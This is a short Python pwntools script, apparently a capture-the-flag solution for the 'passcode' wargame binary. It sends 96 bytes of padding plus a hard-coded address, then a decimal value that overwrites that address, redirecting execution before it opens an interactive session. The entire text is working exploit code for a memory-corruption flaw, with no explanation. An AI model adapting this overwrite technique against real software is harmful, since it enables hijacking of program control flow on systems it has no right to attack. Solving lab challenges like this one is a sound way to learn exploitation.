from pwn import *
import string

conn = process("/home/passcode/passcode")

conn.sendline("A"*96+"\x18\xa0\x04\x08")
conn.sendline("134514135") # 0x080485d7
conn.sendline("trash!")

conn.interactive()
